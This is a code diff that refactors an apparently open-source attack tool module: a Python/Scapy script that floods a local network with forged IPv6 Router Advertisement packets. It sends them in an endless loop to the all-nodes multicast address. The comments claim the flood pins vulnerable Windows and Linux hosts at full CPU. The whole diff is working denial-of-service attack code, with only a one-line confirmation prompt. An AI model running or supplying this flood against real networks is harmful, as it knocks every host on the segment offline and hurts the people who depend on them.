@@ -1,4 +1,6 @@
+import util
 from scapy.all import *
+from dos import DoS
 
 #
 # This is not patched by Microsoft.  Windows 7 and 8 are vulnerable, as well as a handful of (U|L)inux boxes.
@@ -8,23 +10,28 @@ from scapy.all import *
 # at 100% processor usage as they scramble to update routing tables, address info, etc. 
 # More on this attack: http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt
 #
-def initialize():
-	tmp = raw_input('[!] WARNING: This will NDP DoS the entire local network.  Is this correct? ') 
-	if 'n' in tmp.lower(): 
-		return
+__name__='NDP DoS'
+class NDPDoS(DoS):
+	def __init__(self):
+		super(NDPDoS,self).__init__('NDP DoS')
 
-	conf.verb = 0
+	def initialize(self):
+		tmp = raw_input('[!] WARNING: This will NDP DoS the entire local network.  Is this correct? ') 
+		if 'n' in tmp.lower(): 
+			return
 
-	print '[!] Starting Router Advertisement...'
+		conf.verb = 0
 
-	# build the forged packet
-	pkt = IPv6(dst='ff02::1')
-	pkt /= ICMPv6ND_RA()
-	pkt /= ICMPv6NDOptPrefixInfo(prefixlen=64,prefix='ba11:a570::')
+		util.Msg('Starting Router Advertisement...')
 
-	# start DoSing...
-	try:
-		send(pkt, loop=1, inter=0.1)
-	except:
-		pass
-	print '[+] NDP DoS shutdown.'
+		# build the forged packet
+		pkt = IPv6(dst='ff02::1')
+		pkt /= ICMPv6ND_RA()
+		pkt /= ICMPv6NDOptPrefixInfo(prefixlen=64,prefix='ba11:a570::')
+
+		# start DoSing...
+		try:
+			send(pkt, loop=1, inter=0.1)
+		except:
+			pass
+		util.Msg('NDP DoS shutdown.')
